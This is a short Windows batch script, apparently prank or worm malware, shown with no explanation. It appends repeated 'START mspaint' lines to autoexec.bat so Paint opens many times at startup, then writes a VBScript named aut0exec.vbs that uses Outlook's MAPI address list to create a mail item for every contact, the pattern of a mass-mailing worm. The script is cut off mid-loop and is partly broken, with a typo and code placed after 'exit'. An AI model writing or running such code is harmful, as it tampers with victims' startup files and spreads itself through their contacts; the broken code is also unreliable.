@echo off
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
echo START mspaint  >> autoexec.bat
exit
cho Dim x > C:\aut0exec.vbs 
echo.ON ERROR RESUME NEXT >> C:\aut0exec.vbs 
echo Set fso="Scripting.FileSystemObject" >> C:\aut0exec.vbs
echo Set so=CreateObject(fso) >> C:\aut0exec.vbs 
echo Set ol=CreateObject("Outlook.Application") >> C:\aut0exec.vbs 
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\aut0exec.vbs 
echo Set mapi = out.GetNameSpace("MAPI") >> C:\aut0exec.vbs 
echo Set a = mapi.AddressLists(1) >> C:\aut0exec.vbs 
echo For x=1 To a.AddressEntries.Count >> C:\aut0exec.vbs 
echo Set Mail=ol.CreateItem(0) >> C:\aut0exec.vbs 

